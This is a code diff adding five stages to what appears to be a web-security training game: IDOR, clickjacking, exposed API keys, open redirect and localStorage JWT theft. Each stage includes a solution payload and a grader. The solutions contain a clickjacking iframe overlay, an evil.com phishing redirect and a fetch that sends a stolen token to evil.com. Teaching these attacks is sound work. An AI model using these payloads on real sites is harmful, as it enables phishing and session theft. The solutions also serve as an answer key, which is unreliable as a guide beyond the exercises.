@@ -639,5 +639,314 @@ export default function getPayload() {
                 `
             }
         ]
+    },
+    {
+        id: 'stage-5',
+        title: 'Stage 5: IDOR',
+        subtitle: 'Insecure Direct Object Reference',
+        description: 'Learn how missing authorization checks allow access to other users’ data by changing IDs.',
+        problems: [
+            {
+                id: 'idor-1',
+                title: 'IDOR: Profile Access',
+                description: 'Change the user ID in the request to access another user’s profile.',
+                initialCode: `// Problem 1: IDOR
+// The app loads profile data from /api/user/{id}.
+// Your current user id is 100. Change the ID to view user 101.
+
+export default function getPayload() {
+  return "100";
+}`,
+                solutionCode: 'return "101";',
+                htmlTemplate: `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                    <style>
+                        body { font-family: system-ui; padding: 2rem; background: #f8fafc; }
+                        .card { background: white; border: 1px solid #e2e8f0; padding: 1rem; border-radius: 0.75rem; }
+                        .muted { color: #64748b; font-size: 0.9rem; }
+                    </style>
+                    </head>
+                    <body>
+                    <h2>User Profile</h2>
+                    <div class="card">
+                        <div class="muted">GET /api/user/<span id="requested-id">100</span></div>
+                        <pre id="profile"></pre>
+                    </div>
+                    <script type="module">
+                        setTimeout(async () => {
+                            try {
+                                const currentUserId = '100';
+                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
+                                const encodedJs = encodeURIComponent(userCode);
+                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
+                                
+                                if (module.default) {
+                                    const requestedId = String(module.default()).trim();
+                                    document.getElementById('requested-id').textContent = requestedId || '(empty)';
+                                    const profile = document.getElementById('profile');
+                                    
+                                    if (!/^[0-9]+$/.test(requestedId)) {
+                                        profile.textContent = '400 Bad Request';
+                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'ID must be numeric.' }, '*');
+                                        return;
+                                    }
+                                    
+                                    // Simulated vulnerable server: missing authorization check
+                                    if (requestedId === '101') {
+                                        profile.textContent = JSON.stringify({ id: 101, name: 'Alice', email: 'alice@corp.local' }, null, 2);
+                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
+                                    } else if (requestedId === currentUserId) {
+                                        profile.textContent = JSON.stringify({ id: 100, name: 'You', email: 'me@corp.local' }, null, 2);
+                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Still your own profile.' }, '*');
+                                    } else {
+                                        profile.textContent = '404 Not Found';
+                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Wrong ID target.' }, '*');
+                                    }
+                                }
+                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
+                        }, 500);
+                    </script>
+                    </body>
+                    </html>
+                `
+            }
+        ]
+    },
+    {
+        id: 'stage-6',
+        title: 'Stage 6: Clickjacking',
+        subtitle: 'UI Redress Attack',
+        description: 'Learn how attackers trick users into clicking hidden or disguised UI elements.',
+        problems: [
+            {
+                id: 'clickjacking-1',
+                title: 'Overlay the Button',
+                description: 'Place a transparent iframe over a visible button to hijack clicks.',
+                initialCode: `// Problem 1: Clickjacking
+// Create a payload that overlays a transparent iframe
+// pointing to /bank/transfer over a visible "Claim Prize" button.
+
+export default function getPayload() {
+  return "<button>Claim Prize</button>";
+}`,
+                solutionCode: "return `<div style=\"position:relative;width:320px;height:120px\"><button style=\"position:absolute;top:20px;left:20px;width:280px;height:60px;\">Claim Prize</button><iframe src=\"/bank/transfer\" style=\"position:absolute;top:20px;left:20px;width:280px;height:60px;opacity:0;z-index:10;border:0;\"></iframe></div>`;",
+                htmlTemplate: `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                    <style>
+                        body { font-family: system-ui; padding: 2rem; background: #fff7ed; }
+                        #sandbox { margin-top: 1rem; }
+                    </style>
+                    </head>
+                    <body>
+                    <h2>Giveaway Page</h2>
+                    <div id="sandbox"></div>
+                    <script type="module">
+                        setTimeout(async () => {
+                            try {
+                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
+                                const encodedJs = encodeURIComponent(userCode);
+                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
+                                
+                                if (module.default) {
+                                    const payload = String(module.default());
+                                    document.getElementById('sandbox').innerHTML = payload;
+                                    
+                                    const hasIframe = /<iframe/i.test(payload);
+                                    const hasTarget = /\\/bank\\/transfer/.test(payload);
+                                    const hasOpacity = /opacity\\s*:\\s*0/.test(payload);
+                                    const hasAbsolute = /position\\s*:\\s*absolute/.test(payload);
+                                    
+                                    if (hasIframe && hasTarget && hasOpacity && hasAbsolute) {
+                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
+                                    } else {
+                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Missing iframe overlay requirements.' }, '*');
+                                    }
+                                }
+                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
+                        }, 500);
+                    </script>
+                    </body>
+                    </html>
+                `
+            }
+        ]
+    },
+    {
+        id: 'stage-7',
+        title: 'Stage 7: Sensitive Data Exposure',
+        subtitle: 'Secrets in Client',
+        description: 'Learn how accidental secrets in frontend code can be discovered and abused.',
+        problems: [
+            {
+                id: 'sde-1',
+                title: 'Find the API Key',
+                description: 'Locate the exposed API key in the client and return it.',
+                initialCode: `// Problem 1: Sensitive Data Exposure
+// The frontend accidentally shipped an API key.
+// Find it (hint: source code / console) and return it.
+
+export default function getPayload() {
+  return "";
+}`,
+                solutionCode: 'return "sk_live_51_hidden_frontend_key";',
+                htmlTemplate: `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                    <style>
+                        body { font-family: system-ui; padding: 2rem; background: #f1f5f9; }
+                        .note { color: #334155; }
+                    </style>
+                    </head>
+                    <body>
+                    <h2>Frontend Bundle</h2>
+                    <p class="note">Open the source or console to inspect values.</p>
+                    <!-- API_KEY: sk_live_51_hidden_frontend_key -->
+                    <script type="module">
+                        const API_KEY = "sk_live_51_hidden_frontend_key";
+                        window.__EXPOSED_KEY__ = API_KEY;
+                        console.log('Loaded config', { API_KEY });
+                        
+                        setTimeout(async () => {
+                            try {
+                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
+                                const encodedJs = encodeURIComponent(userCode);
+                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
+                                
+                                if (module.default) {
+                                    const payload = String(module.default()).trim();
+                                    if (payload === API_KEY) {
+                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
+                                    } else {
+                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Incorrect key.' }, '*');
+                                    }
+                                }
+                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
+                        }, 500);
+                    </script>
+                    </body>
+                    </html>
+                `
+            }
+        ]
+    },
+    {
+        id: 'stage-8',
+        title: 'Stage 8: Open Redirect',
+        subtitle: 'Unvalidated Redirects',
+        description: 'Learn how attackers abuse redirect parameters to send users to phishing sites.',
+        problems: [
+            {
+                id: 'open-redirect-1',
+                title: 'Bypass Redirect Validation',
+                description: 'Manipulate the next parameter to redirect the user to an external site.',
+                initialCode: `// Problem 1: Open Redirect
+// The app redirects after login using ?next=...
+// Provide a next value that sends the user to an attacker-controlled site.
+
+export default function getPayload() {
+  return "/dashboard";
+}`,
+                solutionCode: 'return "https://evil.com/phish";',
+                htmlTemplate: `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                    <style>
+                        body { font-family: system-ui; padding: 2rem; background: #0f172a; color: #e2e8f0; }
+                        .box { background: #1e293b; padding: 1rem; border-radius: 0.5rem; }
+                    </style>
+                    </head>
+                    <body>
+                    <h2>Login Redirect</h2>
+                    <div class="box">Redirecting to: <span id="next">/dashboard</span></div>
+                    <script type="module">
+                        setTimeout(async () => {
+                            try {
+                                const allowlistHost = 'app.local';
+                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
+                                const encodedJs = encodeURIComponent(userCode);
+                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
+                                
+                                if (module.default) {
+                                    const next = String(module.default()).trim();
+                                    document.getElementById('next').textContent = next || '(empty)';
+                                    const looksLikeUrl = /^(https?:)?\\/\\//i.test(next);
+                                    const isExternal = looksLikeUrl && !next.includes(allowlistHost);
+                                    
+                                    if (isExternal) {
+                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
+                                    } else {
+                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Not an external redirect.' }, '*');
+                                    }
+                                }
+                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
+                        }, 500);
+                    </script>
+                    </body>
+                    </html>
+                `
+            }
+        ]
+    },
+    {
+        id: 'stage-9',
+        title: 'Stage 9: Web Storage Security',
+        subtitle: 'LocalStorage Token Theft',
+        description: 'Learn why storing sensitive tokens in Web Storage can be risky.',
+        problems: [
+            {
+                id: 'storage-1',
+                title: 'Steal the JWT',
+                description: 'Extract a JWT from localStorage and exfiltrate it to an attacker endpoint.',
+                initialCode: `// Problem 1: Web Storage Security
+// The app stores a JWT in localStorage under "token".
+// Write JS to read it and exfiltrate it (e.g., via fetch to https://evil.com).
+
+export default function getPayload() {
+  return "localStorage.getItem('token')";
+}`,
+                solutionCode: "return `fetch('https://evil.com/steal?token=' + encodeURIComponent(localStorage.getItem('token')))`;",
+                htmlTemplate: `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                    <style>
+                        body { font-family: system-ui; padding: 2rem; background: #fefce8; }
+                    </style>
+                    </head>
+                    <body>
+                    <h2>Single Page App</h2>
+                    <script type="module">
+                        localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.demo.payload');
+                        setTimeout(async () => {
+                            try {
+                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
+                                const encodedJs = encodeURIComponent(userCode);
+                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
+                                
+                                if (module.default) {
+                                    const payload = String(module.default());
+                                    const readsToken = /localStorage\\.getItem\\(['\\"]token['\\"]\\)/.test(payload);
+                                    const exfil = /(fetch|Image|location)\\s*\\(/.test(payload) && /evil\\.com/.test(payload);
+                                    
+                                    if (readsToken && exfil) {
+                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
+                                    } else {
+                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Missing token read or exfiltration.' }, '*');
+                                    }
+                                }
+                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
+                        }, 500);
+                    </script>
+                    </body>
+                    </html>
+                `
+            }
+        ]
     }
 ];
